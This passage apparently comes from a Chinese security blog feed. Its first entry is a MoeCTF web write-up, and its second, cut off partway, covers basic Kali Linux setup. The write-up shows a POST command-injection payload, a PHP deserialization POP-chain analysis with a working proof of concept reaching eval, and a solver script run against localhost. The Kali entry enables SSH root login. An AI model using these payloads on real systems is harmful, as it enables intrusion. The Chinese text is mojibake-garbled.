punctuation">&#125;</span></span></code></pre><p>æç¤ºå·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œå¤§å°å†™ç»•è¿‡</p><pre class="language-markup" data-language="markup"><code class="language-markup">flag6: rZV9VX2t</code></pre><p><img src="7ball_4.png" loading="lazy"></p><pre class="language-markup" data-language="markup"><code class="language-markup">POST: what=system('tac /flag7');flag7:rbm93X1dlQn0=</code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">flag: bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0= base64-->      moectf&#123;AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB&#125;</code></pre><h4 id="pop-moe"><a href="#pop-moe" class="headerlink" title="pop moe"></a>pop moe</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$what</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FAILED TO ATTACK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">what</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">payload</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$sec</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dangerous</span><span class="token punctuation">(</span><span class="token variable">$whaattt</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$whaattt</span><span class="token operator">-></span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evvval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mystr</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¯ä»¥åˆ©ç”¨çš„å‡½æ•°æ˜¯<code>class003</code>ç±»çš„<code>evvval</code>å‡½æ•°é‡Œçš„<code>eval</code>ï¼Œç„¶ååæ¨çœ‹çœ‹æ€ä¹ˆè§¦å‘ã€‚</p><p>1.<code>class002</code>ç±»çš„<code>dangerous</code>å‡½æ•°ï¼Œå¦‚æœ<code>$whaattt</code>ä¸º<code>class003</code>ç±»ï¼Œå°±å¯ä»¥è§¦å‘<code>evvval</code></p><p>2.åŒç±»ä¸‹çš„<code>__set</code>å¯ä»¥è§¦å‘<code>dangerous</code>ï¼Œ<code>$b</code>ä¸º<code>dangerous</code>ï¼Œ<code>$sec</code>å°±æ˜¯è¦ä¼ é€’çš„å‚æ•°ï¼Œå°±æ˜¯<code>class003</code></p><p>3.åŒæ—¶æˆ‘ä»¬å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæ­¤æ—¶<code>$sec</code>ä¸º<code>class003</code>ï¼Œé‚£ä¹ˆä½œä¸º<code>evvval</code>å‡½æ•°çš„å‚æ•°ï¼Œè¦æ±‚ä¼ å…¥çš„å˜é‡æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ˜¯ä¸€ä¸ªç±»ï¼Œè¿›è€Œå°±ä¼šè§¦å‘<code>__tostring</code>å‡½æ•°ï¼Œè¿”å›~ç±»çš„<code>$mystr</code>ï¼Œæ‰€ä»¥åªè¦ç»™<code>$mystr</code>èµ‹å€¼ï¼Œå°±è§£å†³äº†<code>eval</code>å‡½æ•°çš„å‚æ•°é—®é¢˜</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></code></pre><p>4.æ¥ç€åå‘åˆ†æï¼Œå¦‚ä½•è§¦å‘<code>__set</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Jay"</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"David"</span><span class="token punctuation">;</span>  <span class="token comment"># å› ä¸ºnameä¸ºç§æœ‰å˜é‡ï¼Œæ‰€ä»¥ä¸€èˆ¬æ¥è¯´æ— æ³•ç›´æ¥èµ‹å€¼çš„ï¼Œæ‰€ä»¥æ­¤æ—¶ä¼šè§¦å‘__seté­”æœ¯æ–¹æ³•</span><span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>  <span class="token comment"># è¾“å‡º"David"</span></code></pre><p>åœ¨class001ç±»ä¸­<code>__invoke</code>å‡½æ•°ï¼Œå¦‚æœ<code>$a</code>ä¸º<code>class002</code>ï¼Œé‚£ä¹ˆåœ¨<code>class002</code>ä¸­å¹¶æ²¡æœ‰<code>payload</code>è¿™æ ·çš„å±æ€§ï¼Œäºæ˜¯ä¼šè§¦å‘<code>class002</code>ä¸­çš„<code>__set</code>ï¼Œæ­¤æ—¶<code>$this-&gt;payl0ad</code>å³ä¸ºä¸Šè¿°ä¾‹å­ä¸­çš„<code>$input</code>ï¼Œä¹Ÿæ˜¯é¢˜ç›®ä¸­<code>__set</code>ä¸­çš„<code>$b</code>ï¼Œæ‰€ä»¥åªéœ€è¦è®©<code>$payl0ad</code>ä¸º<code>dangerous</code>å³å¯</p><p>5.å¦‚ä½•è§¦å‘<code>__invoke</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></code></pre><p>å¾ˆå®¹æ˜“å‘ç°åªéœ€è¦å°†<code>class000</code>ç±»ä¸­çš„<code>$what</code>èµ‹å€¼ä¸º<code>class001</code>å³å¯è§¦å‘<code>__invoke()</code></p><p>è‡³æ­¤ï¼Œå®Œæ•´çš„popé“¾ä¸º</p><pre class="language-php" data-language="php"><code class="language-php">class000<span class="token operator">.</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class000</span><span class="token operator">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class001</span><span class="token operator">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">dangerous</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>POC:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$what</span><span class="token punctuation">;</span> <span class="token comment">// protected</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dangerous'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sec</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">class001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class002</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class003</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span><span class="token operator">-></span><span class="token property">mystr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">moectf&#123;1T_sEEmS_tH@t-YOU_Know-WH4t-is-pOP-lN_pHPpPpPPp!!!39&#125; </code></pre><h4 id="å‹‡é—¯é“œäººé˜µ"><a href="#å‹‡é—¯é“œäººé˜µ" class="headerlink" title="å‹‡é—¯é“œäººé˜µ"></a>å‹‡é—¯é“œäººé˜µ</h4><p><img src="spider.png" loading="lazy"></p><p>æœ‰æ—¶é—´é™åˆ¶ï¼Œæ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯å†™è„šæœ¬é€šå…³</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">getKeyword</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    beautiful_soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>    key_text <span class="token operator">=</span> beautiful_soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"h1"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"status"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key_text<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key_textdirect_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">"åŒ—æ–¹ä¸€ä¸ª"</span><span class="token punctuation">,</span>    <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">"ä¸œåŒ—æ–¹ä¸€ä¸ª"</span><span class="token punctuation">,</span>    <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">"ä¸œæ–¹ä¸€ä¸ª"</span><span class="token punctuation">,</span>    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">"ä¸œå—æ–¹ä¸€ä¸ª"</span><span class="token punctuation">,</span>    <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">"å—æ–¹ä¸€ä¸ª"</span><span class="token punctuation">,</span>    <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">"è¥¿å—æ–¹ä¸€ä¸ª"</span><span class="token punctuation">,</span>    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">"è¥¿æ–¹ä¸€ä¸ª"</span><span class="token punctuation">,</span>    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">"è¥¿åŒ—æ–¹ä¸€ä¸ª"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"http://localhost:7650/"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">restart"</span></span><span class="token punctuation">)</span>getKeyword<span class="token punctuation">(</span>response<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"player"</span><span class="token punctuation">:</span> <span class="token string">"hsad"</span><span class="token punctuation">,</span>    <span class="token string">"direct"</span><span class="token punctuation">:</span> <span class="token string">"å¼Ÿå­æ˜ç™½"</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 7, 1</span>    res <span class="token operator">=</span> getKeyword<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(\d+)'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token comment"># print(match)</span>    number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token keyword">match</span><span class="token punctuation">]</span>    <span class="token comment"># print(number)</span>    <span class="token keyword">if</span> <span class="token string">', '</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        post_data<span class="token punctuation">[</span><span class="token string">'direct'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">ï¼Œ</span><span class="token interpolation"><span class="token punctuation">&#123;</span>direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        post_data<span class="token punctuation">[</span><span class="token string">'direct'</span><span class="token punctuation">]</span> <span class="token operator">=</span> direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>    response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token comment"># print(response.text)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p><img src="spider_2.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KaliLinuxçš„åŸºæœ¬é…ç½®</title>
      <link href="/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>èµ·å› æ˜¯æˆ‘çš„kaliè™šæ‹Ÿæœºçªç„¶å´©æºƒäº†ï¼ŒæŸ¥äº†å¾ˆå¤šèµ„æ–™ä¹Ÿéƒ½æ˜¯æ¨èé‡è£…ï¼Œä¹Ÿæ²¡æœ‰å¾ˆé‡è¦çš„ä¸œè¥¿ï¼Œä½†ä¸€äº›åŸºæœ¬é…ç½®è¿˜æ˜¯éœ€è¦çš„</p><p>è‡³äºä¸‹è½½å®‰è£…ç½‘ä¸Šæ•™ç¨‹å¾ˆå¤šï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯è·Ÿç€é»˜è®¤é€‰é¡¹å³å¯ã€‚</p><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><h4 id="sshè¿æ¥"><a href="#sshè¿æ¥" class="headerlink" title="sshè¿æ¥"></a>sshè¿æ¥</h4><p>å¤§éƒ¨åˆ†linuxéƒ½æ˜¯å‘½ä»¤è¡Œæ¨¡å¼è¾ƒå¤šï¼Œæ‰€ä»¥sshè¿æ¥ä¹Ÿéå¸¸é‡è¦</p><h5 id="ç¼–è¾‘sshé…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘sshé…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘sshé…ç½®æ–‡ä»¶"></a>ç¼–è¾‘sshé…ç½®æ–‡ä»¶</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span class="token comment"># è¿™é‡Œæˆ‘ä½¿ç”¨çš„ç¼–è¾‘å™¨æ˜¯vim å…¶ä»–ä¹Ÿå¯ä»¥</span></code></pre><p><img src="ssh.png" loading="lazy"></p><p>å°†<code>PermitRootLogin</code>åçš„å†…å®¹æ”¹ä¸º<code>yes</code>å¹¶å–æ¶ˆå’Œ<code>PubkeyAuthentication</code>å‰é¢çš„æ³¨é‡Š</p><h5 id="é‡å¯sshæœåŠ¡"><a href="#é‡å¯sshæœåŠ¡" class="headerlink" title="é‡å¯sshæœåŠ¡"></a>é‡å¯sshæœåŠ¡</h5><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/init.d/ssh restart</code></pre><h5 id="sshæœåŠ¡è‡ªå¯"><a href="#sshæœåŠ¡è‡ªå¯" class="headerlink" title="sshæœåŠ¡è‡ªå¯"></a>sshæœåŠ¡è‡ªå¯</h5><pre class="language-bash" data-language="bash"><code class="language-bash">update-rc.d <span class="token function">ssh</span> <span class="token builtin class-name">enable</span></code></pre><h5 id="sshè¿æ¥-1"><a href="#sshè¿æ¥-1" class="headerlink" title="sshè¿æ¥"></a>sshè¿æ¥</h5><p>é¦–å…ˆä½¿ç”¨<code>ifconfig</code>æŸ¥çœ‹è‡ªå·±çš„IPåœ°å€ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯Xshell</p><p><img src="ssh_2.png" loading="lazy"></p><p>ä¸»æœºå¡«å†™è‡ªå·±æŸ¥è¯¢å‡ºæ¥çš„IPï¼Œç«¯å£ä¸º22(linuxä¸€èˆ¬é»˜è®¤éƒ½æ˜¯22)</p><p><img src="ssh_3.png" loading="lazy"></p><p>ç„¶åå¡«å†™è‡ªå·±çš„ç”¨æˆ·å¯†ç è¿æ¥</p><h4 id="æ›´æ¢å›½å†…é•œåƒæº"><a href="#æ›´æ¢å›½å†…é•œåƒæº" class="headerlink" title="æ›´æ¢å›½å†…é•œåƒæº"></a>æ›´æ¢å›½å†…é•œåƒæº</h4><p>ç”±äºæŸäº›åŸå› ï¼Œå¯¼è‡´é€šè¿‡å®˜æ–¹é•œåƒæºä¸‹è½½é€Ÿåº¦å˜æ…¢ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥å°†æºä¿®æ”¹ä¸ºå›½å†…çš„é•œåƒæºã€‚è¿™æ ·åšæœ‰å¾ˆå¤šå¥½å¤„ï¼Œæ¯”å¦‚æé«˜ä¸‹è½½é€Ÿåº¦ï¼Œæé«˜ç¨³å®šæ€§ï¼Œå›½å†…é•œåƒæºåœ¨å›½å†…è®¿é—®æ›´ä¸ºé¡ºç•…ï¼Œä¸å®¹æ˜“å‡ºç°ç½‘ç»œæ³¢åŠ¨å¯¼è‡´çš„ä¸‹è½½å¤±è´¥ï¼›å‡å°‘å»¶è¿Ÿï¼Œè®¿é—®æœ¬åœ°é•œåƒæºå¯ä»¥æœ‰æ•ˆå‡å°‘ç½‘ç»œå»¶è¿Ÿï¼Œæå‡ç³»ç»Ÿæ›´æ–°å’Œè½¯ä»¶å®‰è£…çš„æ•ˆç‡ã€‚</p><h5 id="ç¼–è¾‘apté…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘apté…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘apté…ç½®æ–‡ä»¶"></a>ç¼–è¾‘apté…ç½®æ–‡ä»¶</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/apt/sources.list</code></pre><h5 id="æ›¿æ¢å›½å†…æº"><a href="#æ›¿æ¢å›½å†…æº" class="headerlink" title="æ›¿æ¢å›½å†…æº"></a>æ›¿æ¢å›½å†…æº</h5><p>æ³¨é‡Šæ‰å®˜æ–¹æºï¼ŒæŒ‘é€‰ä»»æ„æºåŠ å…¥å³å¯</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># é˜¿é‡Œäº‘</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment"># 